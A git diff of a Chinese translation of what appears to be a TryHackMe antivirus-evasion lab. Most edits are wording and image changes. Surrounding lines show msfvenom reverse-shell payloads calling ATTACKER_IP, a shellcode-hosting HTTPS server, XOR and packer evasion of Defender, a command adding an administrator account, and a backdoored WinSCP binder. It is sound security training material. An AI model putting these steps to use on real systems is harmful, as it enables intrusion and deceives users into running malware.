@@ -582,7 +582,9 @@ No answer needed
 
 无阶段载荷将最终的 shellcode 直接嵌入到自身中。 将其视为一个打包的应用程序，以单步过程执行 shellcode。 在之前的任务中，我们嵌入了一个可执行文件，该文件嵌入了一个简单的 `calc` shellcode，从而创建了一个无阶段载荷。
 
-![无阶段载荷](img/image_20251141-104108.png)
+<!-- ![Stageless Payload](img/image_20251141-104108.png) -->
+
+![无阶段载荷](img/image_20251149-204902.png)
 
 在上面的示例中，当用户执行恶意载荷时，嵌入的 shellcode 将运行，为攻击者提供反向 shell。
 
@@ -592,11 +594,15 @@ No answer needed
 
 虽然可能存在具有多个阶段的载荷，但通常情况涉及一个两阶段载荷，其中第一阶段，我们称之为**阶段0**，是一个存根 shellcode，它将连接回攻击者的机器以下载要执行的最终 shellcode。
 
-![分阶段载荷 - 阶段0](img/image_20251141-104147.png)
+<!-- ![Staged Payload - stage0](img/image_20251141-104147.png) -->
+
+![分阶段载荷 - 阶段0](img/image_20251149-204920.png)
 
 一旦检索到，阶段0存根将在载荷进程的内存中的某个位置注入最终的 shellcode 并执行它（如下所示）。
 
-![分阶段载荷 - 发送反向 Shell](img/image_20251142-104203.png)
+<!-- ![Staged Payload - Send ReveseShell](img/image_20251142-104203.png) -->
+
+![分阶段载荷 - 发送反向 Shell](img/image_20251149-204935.png)
 
 ### 分阶段 vs. 无阶段
 
@@ -757,15 +763,15 @@ WaitForSingleObject(threadHandle, 0xFFFFFFFF);
 PS C:\> csc staged-payload.cs
 ```
 
-### 使用我们的 stager 运行反向 shell
+### 使用我们的阶段器运行反向 shell
 
-一旦我们的 payload 编译完成，我们将需要设置一个 web 服务器来托管最终的 shellcode。 请记住，我们的 stager 将连接到此服务器以检索 shellcode，并在受害机器的内存中执行它。 让我们首先生成一个 shellcode（文件名需要与我们的 stager 中的 URL 匹配）：
+一旦我们的 payload 编译完成，我们将需要设置一个 web 服务器来托管最终的 shellcode。 请记住，我们的阶段器将连接到此服务器以检索 shellcode，并在受害机器的内存中执行它。 让我们首先生成一个 shellcode（文件名需要与我们的阶段器中的 URL 匹配）：
 
 ```shell title="AttackBox"
 user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
 ```
 
-请注意，我们正在为 shellcode 使用原始格式，因为 stager 会直接将下载的内容加载到内存中。
+请注意，我们正在为 shellcode 使用原始格式，因为阶段器会直接将下载的内容加载到内存中。
 
 现在我们有了一个 shellcode，让我们设置一个简单的 HTTPS 服务器。 首先，我们需要使用以下命令创建一个自签名证书：
 
@@ -779,7 +785,7 @@ user@AttackBox$ openssl req -new -x509 -keyout localhost.pem -out localhost.pem 
 user@AttackBox$ python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
 ```
 
-准备好所有这些后，我们现在可以执行我们的 stager payload。 stager 应该连接到 HTTPS 服务器并检索 shellcode.bin 文件，将其加载到内存中并在受害机器上运行。 请记住设置一个 nc 监听器，以在运行 msfvenom 时指定的相同端口上接收反向 shell：
+准备好所有这些后，我们现在可以执行我们的阶段器 payload。 阶段器应该连接到 HTTPS 服务器并检索 shellcode.bin 文件，将其加载到内存中并在受害机器上运行它。 请记住设置一个 nc 监听器，以在运行 msfvenom 时指定的相同端口上接收反向 shell：
 
 ```shell title="AttackBox"
 user@AttackBox$ nc -lvp 7474
@@ -843,7 +849,7 @@ No answer needed
 
 同样，在 AV 规避技术中，编码也用于隐藏二进制文件中的 shellcode 字符串。 然而，仅靠编码不足以实现规避目的。 如今，AV 软件更加智能，可以分析二进制文件，一旦发现编码字符串，就会对其进行解码以检查文本的原始形式。
 
-您还可以串联使用两个或多个编码算法，使 AV 更难发现隐藏内容。 下图显示我们将 "THM" 字符串转换为十六进制表示，然后使用 Base64 对其进行编码。 在这种情况下，您需要确保您的 dropper 现在处理此类编码以将字符串恢复到其原始状态。
+您还可以串联使用两个或多个编码算法，使 AV 更难发现隐藏内容。 下图显示我们将 "THM" 字符串转换为十六进制表示，然后使用 Base64 对其进行编码。 在这种情况下，您需要确保您的投放器现在处理此类编码以将字符串恢复到其原始状态。
 
 ![双重文本编码技术](img/image_20251134-113408.png)
 
@@ -859,9 +865,9 @@ No answer needed
 
 ### 为什么我们需要了解编码和加密？
 
-AV 供应商实施其 AV 软件，使用静态或动态检测技术将大多数公共工具（如 Metasploit 等）列入阻止列表。 因此，如果不修改这些公共工具生成的 shellcode，您的 dropper 的检测率会很高。
+AV 供应商实施其 AV 软件，使用静态或动态检测技术将大多数公共工具（如 Metasploit 等）列入阻止列表。 因此，如果不修改这些公共工具生成的 shellcode，您的投放器的检测率会很高。
 
-编码和加密可用于 AV 规避技术，我们在其中对 dropper 中使用的 shellcode 进行编码和/或加密，以在运行时将其隐藏起来，避免被 AV 软件发现。 此外，这两种技术不仅可以用于隐藏 shellcode，还可以用于隐藏函数、变量等。 在本房间中，我们主要关注加密 shellcode 以规避 Windows Defender。
+编码和加密可用于 AV 规避技术，我们在其中对投放器中使用的 shellcode 进行编码和/或加密，以在运行时将其隐藏起来，避免被 AV 软件发现。 此外，这两种技术不仅可以用于隐藏 shellcode，还可以用于隐藏函数、变量等。 在本房间中，我们主要关注加密 shellcode 以规避 Windows Defender。
 
 :::info 回答以下问题
 
@@ -927,7 +933,9 @@ Final size of csharp file: 2170 bytes
 
 如果我们尝试将新生成的 payload 上传到我们的测试机器，AV 会在我们有机会执行它之前立即标记它：
 
-![Windows Defender 检测到我们的 payload 为恶意软件!](img/image_20251154-165410.png)
+<!-- ![Windows Defender detected our payload as malicious!](img/image_20251154-165410.png) -->
+
+![Windows Defender 检测到我们的 payload 为恶意软件!](img/image_20251150-205017.png)
 
 如果编码不起作用，我们总是可以尝试加密 payload。 直观上，我们预计这会具有更高的成功率，因为解密 payload 对 AV 来说应该是一项更困难的任务。 让我们现在尝试一下。
 
@@ -948,7 +956,7 @@ Framework Encryption Formats [--encrypt <value>]
     xor
 ```
 
-让我们构建一个XOR加密的有效载荷。 对于这种类型的算法，您需要指定一个密钥。 命令将如下所示：
+让我们构建一个 XOR 加密的 payload。 对于这种类型的算法，您需要指定一个密钥。 命令将如下所示：
 
 ```shell title="Xoring Shellcode using the Metasploit Framework"
 user@AttackBox$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
@@ -960,13 +968,13 @@ Final size of exe file: 7168 bytes
 Saved as: xored-revshell.exe
 ```
 
-再次强调，如果我们将生成的shell上传到THM防病毒检查！ 页面位于`http://MACHINE_IP/`，它仍然会被防病毒软件标记。 原因仍然是防病毒供应商投入了大量时间来确保检测到简单的msfvenom有效载荷。
+再次强调，如果我们将生成的 shell 上传到 THM 防病毒检查！ 页面位于 `http://MACHINE_IP/`，它仍然会被防病毒软件标记。 原因仍然是防病毒供应商投入了大量时间来确保检测到简单的 msfvenom payload。
 
-### 创建自定义有效载荷
+### 创建自定义 payload
 
-克服这个问题的最佳方法是使用我们自己的自定义编码方案，这样防病毒软件就不知道如何分析我们的有效载荷。 请注意，您不必做任何太复杂的事情，只要它足够让防病毒软件分析时感到困惑即可。 对于此任务，我们将采用msfvenom生成的简单反向shell，并使用XOR和Base64的组合来绕过Defender。
+克服这个问题的最佳方法是使用我们自己的自定义编码方案，这样防病毒软件就不知道如何分析我们的 payload。 请注意，您不必做任何太复杂的事情，只要它足够让防病毒软件分析时感到困惑即可。 对于此任务，我们将采用 msfvenom 生成的简单反向 shell，并使用 XOR 和 Base64 的组合来绕过 Defender。
 
-让我们首先以CSharp格式使用msfvenom生成一个反向shell：
+让我们首先以 CSharp 格式使用 msfvenom 生成一个反向 shell：
 
 ```shell title="Generate a CSharp shellcode Format"
 user@AttackBox$ msfvenom LHOST=ATTACKER_IP LPORT=443 -p windows/x64/shell_reverse_tcp -f csharp
@@ -1233,23 +1241,23 @@ C:\> csc UnEncStagelessPayload.cs
 
 我们将使用[ConfuserEx](https://github.com/mkaring/ConfuserEx/releases/tag/v1.6.0)打包器来完成此任务，因为我们的有效载荷是用`.NET`编程的。 为方便起见，您可以在桌面上找到它的快捷方式。
 
-ConfuserEx 将要求您指定其工作文件夹。 请确保选择您的桌面作为基础目录，如下图所示。 设置好基础目录后，将要打包的可执行文件拖放到界面上，您应该会得到以下结果：
+ConfuserEx将要求您指定其工作文件夹。 请确保选择您的桌面作为基础目录，如下图所示。 设置好基础目录后，将要打包的可执行文件拖放到界面上，您应该会得到以下结果：
 
-![打包器配置部分1](img/image_20251110-191013.png)
+![Packer config part1](img/image_20251110-191013.png)
 
-让我们转到设置选项卡并选择我们的有效负载。 选择后，点击“+”按钮将设置添加到您的有效负载中。 这应该会创建一个名为“true”的规则。 请确保同时启用压缩：
+让我们转到设置选项卡并选择我们的有效负载。 选择后，点击"+"按钮将设置添加到您的有效负载中。 这应该会创建一个名为"true"的规则。 请确保同时启用压缩：
 
-![打包器配置部分2](img/image_20251110-191034.png)
+![Packer config part2](img/image_20251110-191034.png)
 
-我们现在将编辑“true”规则并将其设置为最大预设：
+我们现在将编辑"true"规则并将其设置为最大预设：
 
 ![打包器配置部分3](img/image_20251111-191147.png)
 
-最后，我们将转到“保护！”选项卡并点击“保护”：
+最后，我们将转到"保护！"选项卡并点击"保护"：
 
 ![打包器配置部分4](img/image_20251112-191201.png)
 
-新的有效负载应该已准备就绪，并且希望在上传到 THM 防病毒检查器时不会触发任何警报！ （桌面上有快捷方式）。 实际上，如果您执行您的有效负载并设置一个 `nc` 监听器，您应该能够获得一个反向 shell：
+新的有效载荷应该已准备就绪，并且希望在上传到 THM 防病毒检查器时不会触发任何警报！ （桌面上有快捷方式）。 实际上，如果您执行您的有效载荷并设置一个 `nc` 监听器，您应该能够获得一个反向 shell：
 
 ```shell title="AttackBox"
 user@attackbox$ nc -lvp 7478
@@ -1262,9 +1270,9 @@ user@attackbox$ nc -lvp 7478
 虽然击败内存扫描超出了本房间的范围，但您可以做一些简单的事情来避免检测：
 
 - **只需稍等片刻**。 尝试再次生成反向 shell，并在发送任何命令前等待大约 5 分钟。 您会看到防病毒软件不再抱怨。 原因是扫描内存是一项昂贵的操作。 因此，防病毒软件会在您的进程启动后的一段时间内进行扫描，但最终会停止。
-- **使用更小的有效负载**。 有效负载越小，被检测到的可能性就越小。 如果您使用 msfvenom 执行单个命令而不是反向 shell，防病毒软件将更难检测到它。 您可以尝试使用 `msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp` 看看会发生什么。
+- **使用更小的有效载荷**。 有效载荷越小，被检测到的可能性就越小。 如果您使用 msfvenom 执行单个命令而不是反向 shell，防病毒软件将更难检测到它。 您可以尝试使用 `msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp` 看看会发生什么。
 
-如果检测不是问题，您甚至可以使用一个简单的技巧。 从您的反向 shell 中再次运行 cmd.exe。 防病毒软件会检测到您的有效负载并终止相关进程，但不会终止您刚刚生成的新 cmd.exe。
+如果检测不是问题，您甚至可以使用一个简单的技巧。 从您的反向 shell 中再次运行 cmd.exe。 防病毒软件会检测到您的有效载荷并终止相关进程，但不会终止您刚刚生成的新 cmd.exe。
 
 虽然每个防病毒软件的行为都不同，但大多数情况下，都会有类似的方法绕过它们，因此值得探索在测试时注意到的任何奇怪行为。
 
@@ -1302,7 +1310,7 @@ yea
 
 <details>
 
-<summary> 按照说明创建打包的有效负载并将其上传到 THM 防病毒检查器，地址为 `http://MACHINE_IP/` </summary>
+<summary> 按照说明创建打包的有效载荷并将其上传到 THM 防病毒检查器，地址为 `http://MACHINE_IP/` </summary>
 
 ```plaintext
 No answer needed
@@ -1314,7 +1322,7 @@ No answer needed
 
 ## 任务 10 绑定器
 
-虽然不是防病毒绕过方法，但在设计要分发给最终用户的恶意有效负载时，绑定器也很重要。 **绑定器** 是一种将两个（或更多）可执行文件合并为一个的程序。 当您希望将有效负载隐藏在另一个已知程序中分发以欺骗用户相信他们正在执行不同的程序时，通常会使用它。
+虽然不是防病毒绕过方法，但在设计要分发给最终用户的恶意有效载荷时，绑定器也很重要。 **绑定器** 是一种将两个（或更多）可执行文件合并为一个的程序。 当您希望将有效载荷隐藏在另一个已知程序中分发以欺骗用户相信他们正在执行不同的程序时，通常会使用它。
 
 ![绑定器](img/image_20251117-191753.png)
 
@@ -1324,29 +1332,29 @@ No answer needed
 
 ### 使用 msfvenom 进行绑定
 
-您可以使用 `msfvenom` 轻松将您偏好的有效负载植入任何 .exe 文件中。 该二进制文件仍将正常工作，但会静默执行额外的有效负载。 msfvenom 使用的方法通过为您的恶意程序创建一个额外的线程来注入它，因此与之前提到的略有不同，但达到了相同的结果。 拥有一个单独的线程甚至更好，因为如果您的 shellcode 因某种原因失败，您的程序不会被阻塞。
+您可以使用 `msfvenom` 轻松将您偏好的有效载荷植入任何 .exe 文件中。 该二进制文件仍将正常工作，但会静默执行额外的有效载荷。 msfvenom 使用的方法通过为您的恶意程序创建一个额外的线程来注入它，因此与之前提到的略有不同，但达到了相同的结果。 拥有一个单独的线程甚至更好，因为如果您的 shellcode 因某种原因失败，您的程序不会被阻塞。
 
 对于此任务，我们将对位于 `C:\Tools\WinSCP` 的 WinSCP 可执行文件进行后门处理。
 
 要创建后门的 WinSCP.exe，我们可以在 Windows 机器上使用以下命令：
 
-**注意**：为方便起见，Windows 机器上安装了 Metasploit，但生成有效负载可能需要最多三分钟（产生的警告可以安全忽略）。
+**注意**：为方便起见，Windows 机器上安装了 Metasploit，但生成有效载荷可能需要最多三分钟（产生的警告可以安全忽略）。
 
 ```shell title="AttackBox"
 C:\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
 ```
 
-生成的 WinSCP-evil.exe 将在用户不知情的情况下执行 reverse_tcp meterpreter 有效负载。 在执行任何操作之前，请记住设置一个 `nc` 监听器以接收反向 shell。 当您执行后门的可执行文件时，它应该向您发送一个反向 shell，同时继续为用户执行 WinSCP.exe：
+生成的 WinSCP-evil.exe 将在用户不知情的情况下执行 reverse_tcp meterpreter 有效载荷。 在执行任何操作之前，请记住设置一个 `nc` 监听器以接收反向 shell。 当您执行后门的可执行文件时，它应该向您发送一个反向 shell，同时继续为用户执行 WinSCP.exe：
 
 ![img](img/image_20251119-191917.png)
 
 ### 绑定器和防病毒软件
 
-绑定器在隐藏您的有效负载免受防病毒解决方案检测方面作用不大。 简单地将两个可执行文件合并而不做任何更改意味着生成的可执行文件仍会触发原始有效负载的任何签名。
+绑定器在隐藏您的有效载荷免受防病毒解决方案检测方面作用不大。 简单地将两个可执行文件合并而不做任何更改意味着生成的可执行文件仍会触发原始有效载荷的任何签名。
 
-绑定器的主要用途是欺骗用户相信他们正在执行合法的可执行文件而不是恶意有效负载。
+绑定器的主要用途是欺骗用户相信他们正在执行合法的可执行文件而不是恶意有效载荷。
 
-在创建真实有效负载时，您可能希望使用编码器、加密器或打包器来隐藏您的 shellcode 免受基于签名的防病毒软件检测，然后将其绑定到已知的可执行文件中，以便用户不知道正在执行什么。
+在创建真实有效载荷时，您可能希望使用编码器、加密器或打包器来隐藏您的 shellcode 免受基于签名的防病毒软件检测，然后将其绑定到已知的可执行文件中，以便用户不知道正在执行什么。
 
 请随意尝试将您的绑定可执行文件上传到 THM 防病毒检查网站（桌面上有链接）而不进行任何打包，您应该会从服务器收到检测结果，因此这种方法本身在尝试从服务器获取标志时不会有太大帮助。
 
@@ -1364,7 +1372,7 @@ nay
 
 <details>
 
-<summary> 绑定器是否可用于使有效负载看起来像合法的可执行文件？ (是/否) </summary>
+<summary> 绑定器是否可用于使有效载荷看起来像合法的可执行文件？ (是/否) </summary>
 
 ```plaintext
 yea
@@ -1374,9 +1382,9 @@ yea
 
 :::
 
-## 任务11 结论
+## 任务 11 结论
 
-在本房间中，我们探讨了攻击者可用于规避仅依赖基于磁盘检测的防病毒引擎的一些策略。 虽然这只是任何现代防病毒引擎可用机制之一，但我们至少应该能够将我们的有效负载作为第一步传递到受害者的磁盘上。 绕过内存检测和其他高级检测机制留待未来的房间讨论。 您可能想查看 [运行时检测规避](https://tryhackme.com/room/runtimedetectionevasion) 以获取有关绕过可能阻止您的有效负载触发的进一步 Windows 安全机制的更多信息。
+在本房间中，我们探讨了攻击者可用于规避仅依赖基于磁盘检测的防病毒引擎的一些策略。 虽然这只是任何现代防病毒引擎可用机制之一，但我们至少应该能够将我们的有效载荷作为第一步传递到受害者的磁盘上。 绕过内存检测和其他高级检测机制留待未来的房间讨论。 您可能想查看 [运行时检测规避](https://tryhackme.com/room/runtimedetectionevasion) 以获取有关绕过可能阻止您的有效载荷触发的进一步 Windows 安全机制的更多信息。
 
 请记住，任何加密器、编码器或打包器的成功很大程度上取决于防病毒引擎不知道它们的任何特征。 因此，在尝试绕过任何实际解决方案时，能够自定义自己的有效载荷至关重要。
 
